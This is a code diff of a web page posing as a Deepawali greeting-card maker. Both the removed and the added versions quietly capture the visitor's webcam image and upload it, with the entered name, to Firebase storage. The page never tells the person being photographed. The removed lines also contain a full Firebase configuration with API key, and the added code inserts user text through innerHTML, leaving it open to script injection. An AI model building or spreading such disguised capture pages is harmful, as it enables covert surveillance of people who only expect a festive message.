@@ -18,17 +18,23 @@
             color: #fff;
             text-align: center;
         }
-        .container {
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 40px 20px;
+        .container, .popup, .receiver-popup, .message-popup {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
             border-radius: 10px;
             width: 300px;
+            display: none;
+            flex-direction: column;
+            align-items: center;
         }
-        input[type="text"] {
+        .container {
+            display: flex;
+        }
+        input[type="text"], textarea {
             padding: 10px;
             border: none;
             border-radius: 5px;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             font-size: 16px;
             width: 100%;
         }
@@ -39,7 +45,7 @@
             border-radius: 5px;
             width: 100%;
             height: 50px;
-            font-size: 20px;
+            font-size: 18px;
             cursor: pointer;
             outline: none;
             transition: transform 0.3s ease;
@@ -47,10 +53,6 @@
         button:hover {
             transform: scale(1.05);
         }
-        video, canvas {
-            display: none;
-        }
-        /* Loader styling */
         .loader {
             display: none;
             border: 5px solid #f3f3f3;
@@ -65,67 +67,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* Popup styles */
-        .popup {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .popup-content {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            width: 300px;
-            color: #fff;
-            text-align: left;
-            position: relative;
-        }
-        .popup-content img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            position: absolute;
-            top: -50px;
-            left: 50%;
-            transform: translateX(-50%);
-            border: 3px solid #fff;
-        }
-        .popup-content h2, .popup-content p {
-            margin-top: 40px;
-            font-size: 16px;
-            line-height: 1.5;
-        }
-        /* Footer styling */
-        footer {
-            position: fixed;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            font-size: 14px;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            opacity: 0.9;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px;
-            border-radius: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        footer .profile-pic {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border: 2px solid #ffffff;
-        }
     </style>
 </head>
 <body>
@@ -135,208 +76,141 @@
         Your browser does not support the audio element.
     </audio>
 
-    <script>
-        window.onload = function() {
-            const audio = document.getElementById("background-music");
-            audio.play().catch(error => {
-                console.log("Error playing audio: ", error);
-            });
-        };
-    </script>
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <h1>Happy Deepawali Wishes</h1>
+        <button onclick="startProcess()">Create Your Wish</button>
+    </div>
 
-    <div class="container">
-        <h1>We Have A Surprise For You!!</h1>
-        <p>Please enter your name:</p>
-        <input type="text" id="userName" placeholder="Your Name" required>
-        <button id="submitCaptureBtn">Submit</button>
+    <!-- Sender Popup -->
+    <div class="popup" id="senderPopup">
+        <h2>Enter Your Details</h2>
+        <input type="text" id="senderName" placeholder="Your Name" required>
+        <input type="text" id="senderDignity" placeholder="Your Title (e.g., Friend)">
+        <textarea id="senderMessage" placeholder="Your Message" required></textarea>
+        <button onclick="generateLink()">Generate Link</button>
+    </div>
+
+    <!-- Share Link Popup -->
+    <div class="popup" id="linkPopup">
+        <h2>Share this link</h2>
+        <p id="generatedLink"></p>
+        <button onclick="copyLink()">Copy Link</button>
+    </div>
+
+    <!-- Receiver Popup -->
+    <div class="receiver-popup" id="receiverPopup">
+        <h2>Enter Your Name</h2>
+        <input type="text" id="receiverName" placeholder="Receiver's Name" required>
+        <button onclick="captureReceiverImage()">Submit</button>
         <div class="loader" id="loader"></div>
     </div>
 
-    <video id="camera" autoplay></video>
-    <canvas id="canvas"></canvas>
-
-    <!-- Popup for Wishes -->
-    <div class="popup" id="popup">
-        <div class="popup-content">
-            <img id="userImage" src="" alt="User Image">
-            <h2>Dear <span id="userWishName"></span>,</h2>
-            <p id="wishText">Wishing you a very Happy Deepawali filled with joy, prosperity, and peace. May this festival of lights bring happiness to you and your family, and may your home be blessed with warmth and love. May this Deepawali bring light and joy to all aspects of your life.</p>
-            <p>Sincerely,<br>Avinash Mishra <br> (Founder TechSolvy)</p>
-        </div>
+    <!-- Message Popup -->
+    <div class="message-popup" id="messagePopup">
+        <h2>Deepawali Wishes</h2>
+        <p id="letterContent"></p>
     </div>
-    
-    <!-- Receiver Popup -->
-    <div class="popup" id="receiverPopup">
-        <div class="popup-content">
-            <h2>Please enter your name:</h2>
-            <input type="text" id="receiverName" placeholder="Receiver's Name" required>
-            <button id="submitReceiverBtn">Submit</button>
-            <video id="receiverCamera" autoplay></video>
-            <canvas id="receiverCanvas"></canvas>
-        </div>
-    </div>
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
+    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
 
-    <!-- Footer -->
-    <footer>
-        <a href="https://www.techsolvy.online">
-            <img src="ceo.jpeg" alt="Pt. Avinash Mishra Shastri" class="profile-pic"> 
-        </a>
-        Design & Built By Pt. Avinash Mishra Shastri, Founder Of TechSolvy 
-        www.techsolvy.online
-    </footer>
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_AUTH_DOMAIN",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_STORAGE_BUCKET",
+        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+        appId: "YOUR_APP_ID"
+    };
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
-        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+    const db = getFirestore(app);
 
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyAwB8JWKIRK6Bkat-NdM6OyVAvdrBk5cmM",
-            authDomain: "capturedeep-126bf.firebaseapp.com",
-            projectId: "capturedeep-126bf",
-            storageBucket: "capturedeep-126bf.appspot.com",
-            messagingSenderId: "527347157327",
-            appId: "1:527347157327:web:d7db7bb6d0fe021547dd3a",
-            measurementId: "G-VZEFR8X5BN"
-        };
+    let senderDetails = {};
 
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
-        const db = getFirestore(app);
+    // Define startProcess as a global function
+    window.startProcess = function() {
+        console.log("Start process triggered"); // Debug
+        document.getElementById("mainContainer").style.display = "none";
+        document.getElementById("senderPopup").style.display = "flex";
 
-        const userNameInput = document.getElementById('userName');
-        const submitCaptureBtn = document.getElementById('submitCaptureBtn');
-        const camera = document.getElementById('camera');
-        const receiverCamera = document.getElementById('receiverCamera');
-        const canvas = document.getElementById('canvas');
-        const receiverCanvas = document.getElementById('receiverCanvas');
-        const context = canvas.getContext('2d');
-        const receiverContext = receiverCanvas.getContext('2d');
-        const loader = document.getElementById('loader');
-        const popup = document.getElementById('popup');
-        const userWishName = document.getElementById('userWishName');
-        const wishText = document.getElementById('wishText');
-        const userImage = document.getElementById('userImage');
-        const receiverPopup = document.getElementById('receiverPopup');
-        const receiverNameInput = document.getElementById('receiverName');
-        const submitReceiverBtn = document.getElementById('submitReceiverBtn');
+        const audio = document.getElementById("background-music");
+        audio.play().catch(error => console.log("Audio play error:", error));
+    };
 
-        let stream;
+    window.generateLink = function() {
+        console.log("Generate link triggered"); // Debug
+        senderDetails.name = document.getElementById("senderName").value;
+        senderDetails.dignity = document.getElementById("senderDignity").value;
+        senderDetails.message = document.getElementById("senderMessage").value;
 
-        // Open camera
-        async function openCamera(videoElement) {
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            videoElement.srcObject = stream;
+        if (!senderDetails.name || !senderDetails.message) {
+            alert("Please enter your name and message.");
+            return;
         }
 
-        // Handle sender's submission
-        submitCaptureBtn.addEventListener('click', async () => {
-            const userName = userNameInput.value.trim();
-            if (!userName) {
-                alert('Please enter your name.');
-                return;
-            }
-            loader.style.display = 'block'; // Show loader
-            userWishName.textContent = userName;
-            await openCamera(camera);
-            setTimeout(() => {
-                canvas.width = camera.videoWidth;
-                canvas.height = camera.videoHeight;
-                context.drawImage(camera, 0, 0);
-                const imageData = canvas.toDataURL('image/png');
-                uploadImage(imageData, userName);
-            }, 2000);
+        document.getElementById("senderPopup").style.display = "none";
+        document.getElementById("linkPopup").style.display = "flex";
+        document.getElementById("generatedLink").textContent = `www.yourwebsite.com/receiver.html?sender=${senderDetails.name}`;
+    };
+
+    window.copyLink = function() {
+        navigator.clipboard.writeText(document.getElementById("generatedLink").textContent);
+        alert("Link copied to clipboard!");
+    };
+
+    window.captureReceiverImage = async function() {
+        const receiverName = document.getElementById("receiverName").value;
+        if (!receiverName) {
+            alert("Please enter your name.");
+            return;
+        }
+
+        document.getElementById("loader").style.display = "block";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve));
+        const storageRef = ref(storage, `receiver_images/${receiverName}.png`);
+        await uploadBytes(storageRef, blob);
+
+        const imageUrl = await getDownloadURL(storageRef);
+        await saveReceiverData(receiverName, imageUrl);
+
+        stream.getTracks().forEach(track => track.stop());
+        displayMessage(receiverName, imageUrl);
+    };
+
+    async function saveReceiverData(name, imageUrl) {
+        await addDoc(collection(db, "receivers"), {
+            name: name,
+            imageUrl: imageUrl
         });
+    }
 
-        // Upload image to Firebase
-        async function uploadImage(imageData, userName) {
-            const blob = await (await fetch(imageData)).blob();
-            const storageRef = ref(storage, `images/${userName}.png`);
-            await uploadBytes(storageRef, blob);
-            const downloadURL = await getDownloadURL(storageRef);
-            await saveUserData(userName, downloadURL);
-        }
+    function displayMessage(receiverName, imageUrl) {
+        document.getElementById("receiverPopup").style.display = "none";
+        document.getElementById("messagePopup").style.display = "flex";
 
-        // Save user data to Firestore
-        async function saveUserData(userName, imageUrl) {
-            const docRef = await addDoc(collection(db, 'users'), {
-                name: userName,
-                imageUrl: imageUrl,
-                message: "Wishing you a very Happy Deepawali!"
-            });
-            console.log("Document written with ID: ", docRef.id);
-            displayPopup(userName, imageUrl);
-        }
+        const letterContent = `
+            Dear ${receiverName},<br><br>
+            ${senderDetails.message}<br><br>
+            Best regards,<br>${senderDetails.name} (${senderDetails.dignity})
+        `;
+        document.getElementById("letterContent").innerHTML = letterContent;
+        document.getElementById("loader").style.display = "none";
+    }
+</script>
 
-        // Display popup with user's image and name
-        function displayPopup(userName, imageUrl) {
-            userWishName.textContent = userName;
-            userImage.src = imageUrl;
-            popup.style.display = 'flex';
-            loader.style.display = 'none'; // Hide loader
-            stream.getTracks().forEach(track => track.stop()); // Stop the video stream
-            triggerReceiverPopup();
-        }
-
-        // Trigger the receiver popup
-        function triggerReceiverPopup() {
-            receiverPopup.style.display = 'flex';
-            openCamera(receiverCamera); // Open receiver camera
-        }
-
-        // Handle receiver's submission
-        submitReceiverBtn.addEventListener('click', async () => {
-            const receiverName = receiverNameInput.value.trim();
-            if (!receiverName) {
-                alert('Please enter the receiver\'s name.');
-                return;
-            }
-            const receiverImageData = await captureReceiverImage();
-            await uploadReceiverImage(receiverImageData, receiverName);
-            receiverPopup.style.display = 'none'; // Close the receiver popup
-            displayReceiverWish(receiverName);
-        });
-
-        // Capture receiver image
-        async function captureReceiverImage() {
-            receiverCanvas.width = receiverCamera.videoWidth;
-            receiverCanvas.height = receiverCamera.videoHeight;
-            receiverContext.drawImage(receiverCamera, 0, 0);
-            return receiverCanvas.toDataURL('image/png');
-        }
-
-        // Upload receiver image to Firebase
-        async function uploadReceiverImage(imageData, receiverName) {
-            const blob = await (await fetch(imageData)).blob();
-            const storageRef = ref(storage, `images/${receiverName}.png`);
-            await uploadBytes(storageRef, blob);
-            const downloadURL = await getDownloadURL(storageRef);
-            await saveReceiverData(receiverName, downloadURL);
-        }
-
-        // Save receiver data to Firestore
-        async function saveReceiverData(receiverName, imageUrl) {
-            const docRef = await addDoc(collection(db, 'users'), {
-                name: receiverName,
-                imageUrl: imageUrl,
-                message: "Wishing you a very Happy Deepawali!"
-            });
-            console.log("Receiver Document written with ID: ", docRef.id);
-        }
-
-        // Display receiver wish
-        function displayReceiverWish(receiverName) {
-            const personalizedMessage = `Dear ${receiverName}, Wishing you a very Happy Deepawali! May this festival of lights bring happiness to you and your family.`;
-            wishText.textContent = personalizedMessage;
-            popup.style.display = 'flex'; // Show the popup with the personalized message
-        }
-
-        // Initialize camera when the document loads
-        document.addEventListener("DOMContentLoaded", () => {
-            openCamera(camera);
-        });
-    </script>
 </body>
-    </html>
-    
+</html>
